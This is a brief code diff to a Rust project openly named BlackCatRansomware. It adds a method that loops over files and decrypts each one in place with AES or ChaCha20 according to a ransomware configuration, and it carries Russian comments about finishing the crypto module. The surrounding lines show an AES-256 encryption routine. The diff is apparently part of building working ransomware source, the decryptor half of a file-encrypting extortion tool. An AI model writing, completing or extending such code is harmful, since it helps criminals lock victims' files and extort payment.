@@ -29,6 +29,22 @@ impl BlackCatRansomware {
         }
         Ok(())
     }
+
+    // ТЕПЕРЬ ФУНКЦИЯ ВНУТРИ БЛОКА IMPL
+    pub async fn decrypt_all_files(
+        files: Vec<String>,
+        config: RansomwareConfig,
+        crypto_engine: &CryptoEngine,
+    ) -> Result<(), Box<dyn Error>> {
+        let use_chacha20 = config.encryption_algorithm == "chacha20";
+        for file in files {
+            let content = std::fs::read(&file)?;
+            // Здесь вызывается метод, который нужно добавить в crypto.rs
+            let decrypted = crypto_engine.decrypt_file(&content, use_chacha20)?;
+            std::fs::write(&file, decrypted)?;
+        }
+        Ok(())
+    }
 }
 
 fn encrypt_with_aes256(plaintext: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, String> {
